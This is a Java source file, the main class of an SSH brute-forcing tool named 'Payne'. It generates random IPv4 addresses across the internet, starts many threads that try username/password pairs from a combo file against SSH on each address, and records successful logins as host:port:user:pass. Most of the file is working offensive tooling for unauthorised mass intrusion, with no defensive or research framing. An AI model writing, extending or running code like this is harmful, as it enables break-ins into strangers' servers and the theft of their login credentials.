package uk.tsis.payne;

import uk.tsis.payne.threads.Scanner;

import java.io.File;
import java.io.PrintWriter;
import java.security.SecureRandom;
import java.util.*;

public class Payne {

    public static Set<String> results = new HashSet<>(); //host:port:user:pass
    public static List<String> x = new ArrayList<>();

    public static File resultFile = null;

    public static String gen(){
        Random random = new Random();
        return random.nextInt(255) + "." + random.nextInt(255) + "." + random.nextInt(255) + "." + random.nextInt(255);
    }

    public static void main(String[] args){

        if(args.length != 5){//<threads> <shh-port (22 if unsure)> <logfile> <timeout (milliseconds)>
            System.out.println("Args: <threads> <shh-port (22 if unsure)> <logFile> <timeout (milli-seconds)> <creditsFile>");
            System.out.println("Ex: [java -jar Payne.jar 400 22 ./results.txt 5000 ./credits.txt] [java -jar Payne.jar 160 22 /tmp/results.txt 5000 /tmp/credits.txt]");
            System.exit(0);
        }
        int threads =0;
        int timeout =0;
        int sshPort =0;
        try {
            threads = Integer.parseInt(args[0]);
        }catch (NumberFormatException e){

            System.out.println("Incorrect 'threads' value");
            System.exit(0);
        }

        try {
            sshPort = Integer.parseInt(args[1]);
        }catch (NumberFormatException e){

            System.out.println("Incorrect 'sshport' value");
            System.exit(0);
        }

        try {
            timeout = Integer.parseInt(args[3]);
        }catch (NumberFormatException e){

            System.out.println("Incorrect 'timeout' value");
            System.exit(0);
        }

        resultFile = new File(args[2]);
        File comb = new File(args[4]);
        if (!comb.exists()){
            System.out.println("Credits file not found.....");
            System.exit(0);
        }

        System.out.println("Developed by The Secret Intelligence Squadron - HTTPS://TSIS.UK");
        System.out.println(" ");


        if (!resultFile.exists()) {
            try {
                resultFile.createNewFile();
            }catch (Exception e){
                e.printStackTrace();
                return;
            }
        }

        List<Thread> threadList = new ArrayList<>();
        for (int x =0; x < threads; x++){
            threadList.add(new Thread(new Scanner(sshPort, timeout, comb)));
            threadList.get(x).start();
        }

        while(true){
            try{
                Thread.sleep(100 * 1000); //5 min
            }catch (Exception e){

            }
            int pppp = x.size() - results.size();
            System.out.println(" ");
            System.out.println(" //Total Running Scanner Threads: " + threadList.size());
            System.out.println(" //Total Running Brutes: " + Scanner.p);
            System.out.println(" //Total Successful Brutes: " + results.size());
          //  System.out.println(" //Total Failed Brutes: " + pppp);
            System.out.println(" ");
        }

    }

}
